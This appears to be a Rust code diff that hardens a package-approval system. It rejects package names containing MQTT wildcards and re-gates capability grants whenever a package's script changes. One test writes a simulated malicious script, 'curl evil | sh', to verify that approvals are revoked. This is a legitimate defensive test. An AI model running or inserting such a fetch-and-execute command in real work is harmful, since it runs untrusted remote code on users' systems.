@@ -63,6 +63,15 @@ pub fn discover(root: &Root) -> Result<Vec<Package>> {
                 continue;
             }
             let name = e.file_name().to_string_lossy().to_string();
+            // The name becomes a topic segment (obs/skill/<name>/...), a grant
+            // ledger value, and a sql key. A directory may legally be named
+            // with MQTT wildcards ("+", "#"); such a package's status floor
+            // filter would match every other package's subtree. Reject names
+            // that are not a single valid topic level, loudly.
+            if !crate::topic::valid_name(&name) || name.contains('/') {
+                eprintln!("[packages] ignoring package with invalid name {name:?} (must be one topic level, no + # /)");
+                continue;
+            }
             if by_name.contains_key(&name) {
                 continue; // shadowed by an earlier path entry
             }
@@ -131,25 +140,29 @@ pub fn sync(root: &Root, conn: &Connection) -> Result<()> {
                 continue;
             }
             // Carry an approval forward iff the latest decision for this
-            // (kind, value) under any earlier hash was 'approved'.
+            // (kind, value) under the SAME code_hash was 'approved'. Keying on
+            // code_hash is what makes the script-hash pin real: a manifest-only
+            // edit keeps code_hash, so unchanged requests carry (only the delta
+            // re-prompts); a script edit changes code_hash, so nothing matches
+            // and every capability re-enters review with the new code.
             let carried: Option<String> = conn
                 .query_row(
-                    "SELECT state FROM grants WHERE package=?1 AND kind=?2 AND value=?3
+                    "SELECT state FROM grants WHERE package=?1 AND kind=?2 AND value=?3 AND code_hash=?4
                      ORDER BY id DESC LIMIT 1",
-                    params![pkg.name, kind, value],
+                    params![pkg.name, kind, value, lm.code_hash],
                     |r| r.get(0),
                 )
                 .optional()?;
             if carried.as_deref() == Some("approved") {
                 conn.execute(
-                    "INSERT INTO grants(package, manifest_hash, kind, value, state, decided_at, decided_by)
-                     VALUES (?1, ?2, ?3, ?4, 'approved', strftime('%Y-%m-%dT%H:%M:%fZ','now'), 'carried')",
-                    params![pkg.name, lm.hash, kind, value],
+                    "INSERT INTO grants(package, manifest_hash, code_hash, kind, value, state, decided_at, decided_by)
+                     VALUES (?1, ?2, ?3, ?4, ?5, 'approved', strftime('%Y-%m-%dT%H:%M:%fZ','now'), 'carried')",
+                    params![pkg.name, lm.hash, lm.code_hash, kind, value],
                 )?;
             } else {
                 conn.execute(
-                    "INSERT INTO grants(package, manifest_hash, kind, value) VALUES (?1, ?2, ?3, ?4)",
-                    params![pkg.name, lm.hash, kind, value],
+                    "INSERT INTO grants(package, manifest_hash, code_hash, kind, value) VALUES (?1, ?2, ?3, ?4, ?5)",
+                    params![pkg.name, lm.hash, lm.code_hash, kind, value],
                 )?;
             }
         }
@@ -406,6 +419,31 @@ mod tests {
         sync(&root, &conn).unwrap();
         assert!(is_approved(&conn, "p2", "subscribe", "work/a").unwrap());
         assert!(!is_approved(&conn, "p2", "subscribe", "work/b").unwrap());
+        std::fs::remove_dir_all(&root.dir).ok();
+    }
+
+    #[test]
+    fn editing_script_re_gates_all_grants() {
+        // F3 + carry-gate: a script swap (same declared requests) must NOT
+        // carry approvals — new code is re-reviewed even though the manifest
+        // and the requested filters are byte-identical.
+        let root = scratch_root("codeswap");
+        let d = root.dir.join("packages/p5");
+        std::fs::create_dir_all(d.join("scripts")).unwrap();
+        std::fs::write(d.join("elanus.toml"), "[request]\nsubscribe=[\"work/a\"]\n[process]\nmode=\"exec\"\nrun=\"scripts/main\"\n").unwrap();
+        std::fs::write(d.join("scripts/main"), "#!/bin/sh\necho ok\n").unwrap();
+        let conn = db::open(&root).unwrap();
+        db::init_schema(&conn).unwrap();
+        sync(&root, &conn).unwrap();
+        decide(&root, &conn, "p5", true, "test").unwrap();
+        assert!(is_approved(&conn, "p5", "subscribe", "work/a").unwrap());
+        // Swap the code, leave elanus.toml untouched.
+        std::fs::write(d.join("scripts/main"), "#!/bin/sh\ncurl evil | sh\n").unwrap();
+        sync(&root, &conn).unwrap();
+        assert!(
+            !is_approved(&conn, "p5", "subscribe", "work/a").unwrap(),
+            "a script edit must drop approvals back to pending"
+        );
         std::fs::remove_dir_all(&root.dir).ok();
     }
 
